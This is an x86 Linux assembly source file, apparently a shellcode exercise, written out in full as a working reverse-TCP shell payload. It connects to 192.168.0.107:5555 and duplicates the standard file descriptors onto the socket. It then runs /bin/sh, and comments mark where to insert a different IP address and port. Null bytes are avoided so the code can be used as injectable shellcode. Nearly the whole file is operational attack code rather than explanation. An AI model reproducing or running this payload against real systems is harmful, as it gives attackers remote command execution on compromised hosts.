; Filename: shellcode_reverse_tcp_V2.asm
; Purpose: Translate shell_reverse_tcp.c in assembly

; Reference

; from /usr/include/linux/net.h:
; SYS_SOCKET  1       
; SYS_CONNECT 3

; from /usr/include/netinet/in.h
; #define INADDR_ANY              ((in_addr_t) 0x00000000)

; from /usr/include/i386-linux-gnu/bits/socket.h
; #define PF_INET         2       /* IP protocol family.  */
; #define AF_INET         PF_INET
; #define SOCK_SIZE__     16    /* sizeof(struct sockaddr) */


global _start

section .text

_start:

    ; CREATE A SOCKET - int socket(int domain, int type, int protocol);

    ; EAX = 0x66 (socketcall), EBX = 0x1 (socket())
    ; ECX = ESP(0x2 (AF_INET), 0x1 (SOCKSTREAM), 0x0)

    xor ebx, ebx    ; zero EBX 
    mul ebx         ; zero EAX and EDX
    push eax        ; for protocol
    mov al, 0x66    ; mov socket syscall into EAX
    mov bl, 0x1     ; for socket() 
    push ebx        ; for type
    push byte 0x2   ; for domain
    mov ecx, esp    ; move pointer to args in ECX
    int 0x80        

    xchg edi, eax   ; move the return value of socket() (socket file descriptor) into EDI

    ; Connect to ip address and port
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; EAX = 0x66 (socketcall), EBX = 0x3 (connect())
    ; ECX = ESP(socket, address struct, 0x10)

    ; address.sin_family = AF_INET;
    ; address.sin_port = htons(PORT);
    ; address.sin_addr.s_addr = 127.0.0.1;

    ; INSERT IP ADDRESS BELOW

    add al, 0x6b          ; use ADD and SHL to insert IP address 192.168.0.107 (0xc0 0xa8 0x0 0x6b) in dword without creating 0x00
    shl eax, 0x10 
    add al, 0xa8
    shl eax, 0x8
    add al, 0xc0

    push eax            ; push IP address on the stack

    ; INSERT PORT NUMBER BELOW

    push word 0xb315    ; push PORT number 5555 (0x15b3) on the stack 
    
    push word 0x2       ; for AF_INET
    mov ecx, esp        ; move pointer to args in ECX

    xor eax, eax        ; zero EAX
    mov al, 0x66        ; mov socket syscall into EAX
    mov bl, 0x3         ; for connect()
    push dword 0x10     ; for socklen_t addrlen 
    push ecx            ; for const struct sockaddr *addr
    push edi            ; for sockfd
    mov ecx, esp        ; move pointer to args in ECX
    int 0x80        

    ; DUPLICATE FILE DESCRIPTOR - int dup2(int oldfd, int newfd);
    ; EAX = 0x3f (dup2), EBX = old file descriptor (sockfd)
    ; ECX = new file descriptor (0 = STDIN / 1 = STDOUT / 2 = STDERR)

    mov al, 0x3f    ; for dup2()
    mov ebx, edi    ; for old file descriptor 
    xor ecx, ecx    ; zero ECX for new file descriptor (0)
    int 0x80        

    mov al, 0x3f    ; same as above
    mov ebx, edi    ; same as above
    inc ecx         ; ECX is 0x1 for new file descriptor (1)
    int 0x80

    mov al, 0x3f    ; same as above
    mov ebx, edi    ; same as above
    inc ecx         ; ECX is 0x1 for new file descriptor (2)
    int 0x80

    ; EXECVE SYSCALL - int execve(const char *filename, char *const argv[], char *const envp[]);
    ; EAX = 0xb, EBX = "//bin/sh"
    ; ECX = ESP("//bin/sh", 0), EDX = NULL

    xor eax, eax
    push eax        ; push EAX (0x00000000) for *const envp[]
    push 0x68732f6e ; push "sh/n"
    push 0x69622f2f ; push "ib//"

    mov ebx, esp    ; argument 1: const char *filename
    push eax        ; EAX is already NULL
    mov edx, esp    ; argument 3: char *const envp[]
    push ebx        ; push EBX on stack for argument 2
    mov ecx, esp    ; argument 2: char *const argv[] 
    mov al, 11     ; syscall = execve()
    int 0x80        ; invoke execve()
